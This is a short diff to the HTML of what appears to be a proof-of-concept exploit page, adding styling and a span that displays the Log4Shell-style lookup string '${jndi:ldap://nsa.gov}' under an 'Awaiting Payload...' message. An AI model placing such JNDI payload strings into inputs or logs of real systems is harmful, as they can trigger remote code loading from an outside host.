@@ -46,6 +46,11 @@
 
             transform: translate(-50%, -50%);
         }
+
+        .j {
+            font-size: 15px;
+            color: #2F3335;
+        }
     </style>
     <script>
         function allset() {
@@ -67,9 +72,12 @@
 </html>
 
 <body onload="setTimeout(poc, 1500);">
+
     <div id="loader" class="loader"></div>
     <div id="awaiting" class="info" style="display:none;">
         Awaiting Payload...
+        <br />
+        <span class="j">${jndi:ldap://nsa.gov}</span>
     </div>
 
     <div id="allset" class="info" style="display:none;">
